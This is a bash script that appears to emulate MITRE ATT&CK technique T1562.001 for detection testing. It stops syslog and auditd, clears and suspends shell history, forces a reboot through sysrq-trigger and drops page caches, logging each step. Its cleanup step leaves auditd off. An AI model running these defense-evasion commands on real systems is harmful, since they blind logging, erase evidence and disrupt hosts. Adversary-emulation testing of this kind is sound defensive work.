#! /bin/bash

# T1562.001 - Impair Defenses: Disable or Modify Tools

function a() {
    # Test 1 - Disable syslog
    systemctl stop rsyslog 
    systemctl disable rsyslog
    systemctl stop auditd
    echo  $(date -u) "Completed T1562.001 - Disable syslog" >> /tmp/attacktest.txt
    sleep 30
}

function b() {
    # Test 38 - Clear History
    history -c
    echo  $(date -u) "Completed T1562.001 - Clear History" >> /tmp/attacktest.txt
    sleep 30
}

function c() {
    # Test 39 - Suspend History
    set +o history
    echo  $(date -u) "Completed T1562.001 - Suspend History" >> /tmp/attacktest.txt
    sleep 30
}

function d() {
    # Test 40 - Reboot Linux Host via Kernel System Request
    echo 1> /proc/sys/kernel/sysrq 
    echo b> /proc/sysrq-trigger
    echo  $(date -u) "Completed T1562.001 - Reboot Linux Host via Kernel System Request" >> /tmp/attacktest.txt
    sleep 30
}

function e() {
    # Test 41 - Clear Pagging Cache
    free && echo 3 > /proc/sys/vm/drop_caches && free
    echo 3> /proc/sys/vm/drop_caches
    echo  $(date -u) "Completed T1562.001 - Clear Pagging Cache" >> /tmp/attacktest.txt
    sleep 30
}

function z() {
    # Clean up
    systemctl start rsyslog
    systemctl enable rsyslog
    set -o history
    echo  $(date -u) "Completed T1562.001 - Cleaned up" >> /tmp/attacktest.txt
    sleep 30
}


a
b
c
d
e
z
